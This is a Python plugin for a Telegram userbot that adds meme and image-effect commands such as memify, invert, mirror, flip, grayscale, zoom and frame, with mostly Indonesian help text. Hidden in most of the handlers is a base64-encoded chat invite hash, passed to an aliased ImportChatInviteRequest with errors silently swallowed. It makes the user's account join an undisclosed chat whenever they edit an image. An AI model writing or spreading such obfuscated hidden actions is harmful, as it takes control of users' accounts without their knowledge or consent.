"""
Created by @mrconfused and @sandy1709
memify plugin
"""
import asyncio
import os
import random

from ..utils import admin_cmd, sudo_cmd
from . import (
    CMD_HELP,
    LOGS,
    add_frame,
    asciiart,
    cat_meeme,
    cat_meme,
    convert_toimage,
    convert_tosticker,
    crop,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    reply_id,
    runcmd,
    solarize,
    take_screen_shot,
)


def random_color():
    number_of_colors = 2
    return [
        "#" + "".join([random.choice("0123456789ABCDEF") for j in range(6)])
        for i in range(number_of_colors)
    ]


CNG_FONTS = "userbot/helpers/styles/impact.ttf"
FONTS = "1. `ProductSans-BoldItalic.ttf`\n2. `ProductSans-Light.ttf`\n3. `RoadRage-Regular.ttf`\n4. `digital.ttf`\n5. `impact.ttf`"
font_list = [
    "ProductSans-BoldItalic.ttf",
    "ProductSans-Light.ttf",
    "RoadRage-Regular.ttf",
    "digital.ttf",
    "impact.ttf",
]


@bot.on(admin_cmd(outgoing=True, pattern="(mmf|mms) ?(.*)"))
@bot.on(sudo_cmd(pattern="(mmf|mms) ?(.*)", allow_sudo=True))
async def memes(cat):
    cmd = cat.pattern_match.group(1)
    catinput = cat.pattern_match.group(2)
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`kung...`")
        return
    catid = cat.reply_to_msg_id
    if catinput:
        if ";" in catinput:
            top, bottom = catinput.split(";", 1)
        else:
            top = catinput
            bottom = ""
    else:
        await edit_or_reply(
            cat,
            "```apa yang harus saya tulis di atas? bahwa kamu bodoh memberikan beberapa teks```",
        )
        return
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Mendownload media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Media yang Didukung tidak ditemukan...```")
        return
    import base64

    if catsticker.endswith(".tgs"):
        await cat.edit(
            "```Waktu Transfigurasi!  Mwahaha memperingati stiker animasi ini! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
    elif catsticker.endswith(".webp"):
        await cat.edit(
            "```Waktu Transfigurasi!  Mwahaha memifying stiker ini! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template tidak ditemukan... `")
            return
        meme_file = catfile
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit(
            "```Waktu Transfigurasi!  Mwahaha memifying video ini! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template tidak ditemukan...```")
            return
        meme_file = catfile
    else:
        await cat.edit(
            "```Waktu Transfigurasi!  Mwahaha memifying gambar ini! (」ﾟﾛﾟ)｣```"
        )
        meme_file = catsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    meme = "catmeme.jpg"
    if max(len(top), len(bottom)) < 21:
        await cat_meme(CNG_FONTS, top, bottom, meme_file, meme)
    else:
        await cat_meeme(top, bottom, CNG_FONTS, meme_file, meme)
    if cmd != "mmf":
        meme = await convert_tosticker(meme)
    await cat.client.send_file(cat.chat_id, meme, reply_to=catid)
    await cat.delete()
    os.remove(meme)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(pattern="cfont (.*)"))
@bot.on(sudo_cmd(pattern="cfont (.*)", allow_sudo=True))
async def lang(event):
    global CNG_FONTS
    input_str = event.pattern_match.group(1)
    if input_str not in font_list:
        catevent = await edit_or_reply(event, "`Give me a correct font name...`")
        await asyncio.sleep(1)
        await catevent.edit(f"**Available Fonts names are here:-**\n\n{FONTS}")
    else:
        arg = f"userbot/helpers/styles/{input_str}"
        CNG_FONTS = arg
        await edit_or_reply(event, f"**Fonts for Memify changed to :-** `{input_str}`")


@bot.on(admin_cmd(outgoing=True, pattern="ascii ?(.*)"))
@bot.on(sudo_cmd(pattern="ascii ?(.*)", allow_sudo=True))
async def memes(cat):
    catinput = cat.pattern_match.group(1)
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media...`")
        return
    catid = await reply_id(cat)
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media......`")
    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found...```")
        return
    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit(
            "```Transfiguration Time! Mwahaha converting to ascii image of this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit(
            "```Transfiguration Time! Mwahaha converting to ascii image of this sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit(
            "```Transfiguration Time! Mwahaha converting to ascii image of this video! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
        jisanidea = True
    else:
        await cat.edit(
            "```Transfiguration Time! Mwahaha converting to asci image of this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = catsticker
    meme_file = convert_toimage(meme_file)
    outputfile = "ascii_file.webp" if jisanidea else "ascii_file.jpg"
    c_list = random_color()
    color1 = c_list[0]
    color2 = c_list[1]
    bgcolor = "#080808" if not catinput else catinput
    asciiart(meme_file, 0.3, 1.9, outputfile, color1, color2, bgcolor)
    await cat.client.send_file(cat.chat_id, outputfile, reply_to=catid)
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(pattern="invert$", outgoing=True))
@bot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(cat):
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media...`")
        return
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found...```")
        return
    import base64

    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this video! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
        jisanidea = True
    else:
        await cat.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = catsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if jisanidea else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await cat.client.send_file(
        cat.chat_id, outputfile, force_document=False, reply_to=catid
    )
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="solarize$"))
@bot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(cat):
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media...`")
        return
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found...```")
        return
    import base64

    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit(
            "```Transfiguration Time! Mwahaha solarizeing this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit(
            "```Transfiguration Time! Mwahaha solarizeing this sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit(
            "```Transfiguration Time! Mwahaha solarizeing this video! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
        jisanidea = True
    else:
        await cat.edit(
            "```Transfiguration Time! Mwahaha solarizeing this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = catsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if jisanidea else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await cat.client.send_file(
        cat.chat_id, outputfile, force_document=False, reply_to=catid
    )
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="mirror$"))
@bot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(cat):
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media...`")
        return
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found...```")
        return
    import base64

    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit(
            "```Transfiguration Time! Mwahaha converting to mirror image of this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit(
            "```Transfiguration Time! Mwahaha converting to mirror image of this sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit(
            "```Transfiguration Time! Mwahaha converting to mirror image of this video! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
        jisanidea = True
    else:
        await cat.edit(
            "```Transfiguration Time! Mwahaha converting to mirror image of this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = catsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if jisanidea else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await cat.client.send_file(
        cat.chat_id, outputfile, force_document=False, reply_to=catid
    )
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="flip$"))
@bot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(cat):
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media...`")
        return
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found...```")
        return
    import base64

    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit(
            "```Transfiguration Time! Mwahaha fliping this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit(
            "```Transfiguration Time! Mwahaha fliping this sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit(
            "```Transfiguration Time! Mwahaha fliping this video! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
        jisanidea = True
    else:
        await cat.edit(
            "```Transfiguration Time! Mwahaha fliping this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = catsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if jisanidea else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await cat.client.send_file(
        cat.chat_id, outputfile, force_document=False, reply_to=catid
    )
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="gray$"))
@bot.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(cat):
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media...`")
        return
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found...```")
        return
    import base64

    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit(
            "```Transfiguration Time! Mwahaha changing to black-and-white this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit(
            "```Transfiguration Time! Mwahaha changing to black-and-white this sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit(
            "```Transfiguration Time! Mwahaha changing to black-and-white this video! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
        jisanidea = True
    else:
        await cat.edit(
            "```Transfiguration Time! Mwahaha changing to black-and-white this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = catsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if jisanidea else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await cat.client.send_file(
        cat.chat_id, outputfile, force_document=False, reply_to=catid
    )
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@bot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(cat):
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media...`")
        return
    catinput = cat.pattern_match.group(1)
    catinput = 50 if not catinput else int(catinput)
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found...```")
        return
    import base64

    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit(
            "```Transfiguration Time! Mwahaha zooming this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit(
            "```Transfiguration Time! Mwahaha zooming this sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit(
            "```Transfiguration Time! Mwahaha zooming this video! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
    else:
        await cat.edit(
            "```Transfiguration Time! Mwahaha zooming this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = catsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if jisanidea else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, catinput)
    except Exception as e:
        return await cat.edit(f"`{e}`")
    try:
        await cat.client.send_file(
            cat.chat_id, outputfile, force_document=False, reply_to=catid
        )
    except Exception as e:
        return await cat.edit(f"`{e}`")
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@bot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(cat):
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media...`")
        return
    catinput = cat.pattern_match.group(1)
    if not catinput:
        catinput = 50
    if ";" in str(catinput):
        catinput, colr = catinput.split(";", 1)
    else:
        colr = 0
    catinput = int(catinput)
    colr = int(colr)
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found...```")
        return
    import base64

    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit(
            "```Transfiguration Time! Mwahaha framing this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit(
            "```Transfiguration Time! Mwahaha framing this sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit(
            "```Transfiguration Time! Mwahaha framing this video! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
    else:
        await cat.edit(
            "```Transfiguration Time! Mwahaha framing this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = catsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if jisanidea else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, catinput, colr)
    except Exception as e:
        return await cat.edit(f"`{e}`")
    try:
        await cat.client.send_file(
            cat.chat_id, outputfile, force_document=False, reply_to=catid
        )
    except Exception as e:
        return await cat.edit(f"`{e}`")
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CMD_HELP.update(
    {
        "memify": "__**NAMA PLUGIN :** Memify__\
    \n\n✅** CMD ➥** `.mmf toptext ; bottomtext`\
    \n**Fungsi   ➥  **Membuat meme gambar dengan memberi teks di lokasi dan pengiriman tertentu\
    \n\n✅** CMD ➥** `.mms toptext ; bottomtext`\
    \n**Fungsi   ➥  **Membuat meme stiker dengan teks give di lokasi dan pengiriman tertentu\
    \n\n✅** CMD ➥** `.cfont` <Font Name>\
    \n**Fungsi   ➥  **Ubah gaya font yang digunakan untuk memori, \ Untuk mendapatkan nama font gunakan cmd ini (`.ls userbot/helpers/styles`)\
    \n\n✅** CMD ➥** `.ascii`\
    \n**Fungsi   ➥  **Balas file media untuk mendapatkan gambar ascii dari media itu\
    \n\n✅** CMD ➥** `.invert`\
    \n**Fungsi   ➥  **Membalik warna di file media\
    \n\n✅** CMD ➥** `.solarize`\
    \n**Fungsi   ➥  **Saksikan matahari membakar file media Anda\
    \n\n✅** CMD ➥** `.mirror`\
    \n**Fungsi   ➥  **Menunjukkan refleksi dari file media\
    \n\n✅** CMD ➥** `.flip`\
    \n**Fungsi   ➥  **Menampilkan gambar terbalik dari file media yang diberikan\
    \n\n✅** CMD ➥** `.gray`\
    \n**Fungsi   ➥  **Menjadikan file media Anda hitam putih\
    \n\n✅** CMD ➥** `.zoom` or `.zoom range`\
    \n**Fungsi   ➥  **Memperbesar file media Anda\
    \n\n✅** CMD ➥** `.frame` atau `.frame range` atau `.frame range ; fill`\
    \n**Fungsi   ➥  **Buat bingkai untuk file media Anda\
    \n**Isi:** Ini menentukan nilai isian piksel atau nilai warna yang akan diterapkan.  Nilai defaultnya adalah 0 yang artinya warnanya hitam.\
    "
    }
)
